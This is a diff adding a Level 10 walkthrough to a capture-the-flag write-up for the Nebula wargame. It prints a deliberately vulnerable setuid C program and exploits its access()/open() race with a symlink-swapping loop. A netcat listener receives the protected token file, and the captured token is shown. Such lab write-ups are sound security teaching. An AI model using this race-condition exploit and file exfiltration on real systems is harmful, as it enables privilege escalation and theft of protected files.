@@ -411,3 +411,196 @@ You have successfully executed getflag on a target account
 ```
 
 Success.
+
+## Level 10
+
+The setuid binary at /home/flag10/flag10 binary will upload any file given, as long as it meets the requirements of the access() system call.
+
+To do this level, log in as the level10 account with the password level10. Files for this level can be found in /home/flag10.
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <string.h>
+
+int main(int argc, char **argv)
+{
+  char *file;
+  char *host;
+
+  if(argc < 3) {
+      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
+      exit(1);
+  }
+
+  file = argv[1];
+  host = argv[2];
+
+  if(access(argv[1], R_OK) == 0) {
+      int fd;
+      int ffd;
+      int rc;
+      struct sockaddr_in sin;
+      char buffer[4096];
+
+      printf("Connecting to %s:18211 .. ", host); fflush(stdout);
+
+      fd = socket(AF_INET, SOCK_STREAM, 0);
+
+      memset(&sin, 0, sizeof(struct sockaddr_in));
+      sin.sin_family = AF_INET;
+      sin.sin_addr.s_addr = inet_addr(host);
+      sin.sin_port = htons(18211);
+
+      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
+          printf("Unable to connect to host %s\n", host);
+          exit(EXIT_FAILURE);
+      }
+
+#define HITHERE ".oO Oo.\n"
+      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
+          printf("Unable to write banner to host %s\n", host);
+          exit(EXIT_FAILURE);
+      }
+#undef HITHERE
+
+      printf("Connected!\nSending file .. "); fflush(stdout);
+
+      ffd = open(file, O_RDONLY);
+      if(ffd == -1) {
+          printf("Damn. Unable to open file\n");
+          exit(EXIT_FAILURE);
+      }
+
+      rc = read(ffd, buffer, sizeof(buffer));
+      if(rc == -1) {
+          printf("Unable to read from file: %s\n", strerror(errno));
+          exit(EXIT_FAILURE);
+      }
+
+      write(fd, buffer, rc);
+
+      printf("wrote file!\n");
+
+  } else {
+      printf("You don't have access to %s\n", file);
+  }
+}
+```
+
+Let's log in as level10. 
+
+The target program basically sends a file to the host specified by the user.
+
+So, to execute the program we should set the file as first argument and the host as second argument.
+
+Let's run `nc -lvnp 18211` on another terminal to listen to incoming connections and use `./flag10` to send a file we know we have access to (i.e. `/etc/passwd`):
+
+```
+level10@nebula:/home/flag10$ ./flag10 /etc/passwd 192.168.56.1
+Connecting to 192.168.56.1:18211 .. Connected!
+Sending file .. wrote file!
+```
+
+We successfully sent the file using `./flag10` executable. I'm not printing the results because `/etc/passwd` is quite long...
+
+Checking the content of `/home/flag10` we can notice again a `token` file.
+
+```
+level10@nebula:/home/flag10$ ls -la
+total 14
+...
+-rwsr-x--- 1 flag10 level10 7743 2011-11-20 21:22 flag10
+...
+-rw------- 1 flag10 flag10    37 2011-11-20 21:22 token
+```
+
+We can't read it, and we can't send it using `./flag10` because `access(argv[1], R_OK)` checks the permissions.
+
+Can we do something else? Let's read `man access`:
+
+"access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced".
+
+So if we use a symlink it's dereferenced, nice to know. Let's read further:
+
+"Using  access()  to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates  a  security  hole,  because the user might exploit the  short time interval between checking and opening  the  file  to  manipulate  it."
+
+That's actually called "TOC-TOU Weakness".
+
+The access checks the permission of the file linked to the symlink. If we use a file we can't access, such as the `token` file, the `access()` would return an error. 
+
+But if we create a new fake file, we can swap the pointers during the time span between the `access()` and the `open()`.
+
+The idea is to:
+1. Create a `/tmp/faketoken` file we can access;
+2. Create a `/tmp/link` symlink that points to 'tmp/faketoken';
+3. Pass `/tmp/link -> /tmp/faketoken` to the `access()`;
+4. Update `/tmp/link` to point to `/home/flag10/token` before the `open()`;
+5. Pass `tmp/link -> /home/flag10/token` to the `open()`;
+
+This way, we can use `./flag10` to send the `token` file to another terminal and read its content.
+
+Let's create the fake file: `touch /tmp/faketoken`.
+
+Now we can write a simple script to help us to do the swapping thing:
+
+```
+while true; 
+do 
+    ln -sf /home/flag10/token /tmp/link;
+    ln -sf /tmp/faketoken /tmp/link; 
+done &
+```
+
+Actually we can also write is as a one-liner:
+
+```
+while true; do ln -sf /home/flag10/token /tmp/link; ln -sf /tmp/faketoken /tmp/link; done &
+```
+
+Let's run it:
+
+```
+level10@nebula:/home/flag10$ touch /tmp/faketoken
+level10@nebula:/home/flag10$ while true; do ln -sf /home/flag10/token /tmp/link; ln -sf /tmp/faketoken /tmp/link; done &
+[1] 3700
+```
+
+Now we just have to use `/tmp/link` as argument of `./flag10`, trying multiple runs in hope that the `access()` gets the `faketoken` and the `open()` gets the `token`.
+
+Let's write an infinite loop to help us accomplish what we just said:
+
+```
+while true; do /home/flag10/flag10 /tmp/link 192.168.56.1; done
+```
+
+Let's run `nc -lvnp 18211` on the helper terminal again, then we can run the attack:
+
+I wasn't able to catch the moment where the file is sent on the host machine, but on the helper terminal we can surely check the attack was successful:
+
+```
+nc -lvnp 18211
+Connection from 192.168.56.101:54140
+.oO Oo.
+615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
+```
+
+Now we just have to use this string to log in as flag10 and run `/bin/getflag`:
+
+```
+...
+flag10@nebula:~$ getflag
+You have successfully executed getflag on a target account
+...
+```
+
+Success.
+
+## Level 13
+
